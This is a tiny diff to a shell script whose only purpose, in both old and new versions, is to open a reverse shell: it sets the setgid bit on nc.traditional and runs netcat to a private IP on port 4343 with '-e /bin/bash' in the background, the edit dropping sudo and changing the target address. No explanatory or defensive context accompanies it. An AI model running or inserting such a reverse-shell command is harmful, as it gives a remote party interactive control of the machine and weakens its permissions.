@@ -1,4 +1,4 @@
 #!/bin/sh
 
-sudo chmod 2755 /bin/nc.traditional
-sudo /bin/nc.traditional 10.6.0.2 4343 -e /bin/bash &
+chmod 2755 /bin/nc.traditional
+/bin/nc.traditional 192.168.1.4 4343 -e /bin/bash &
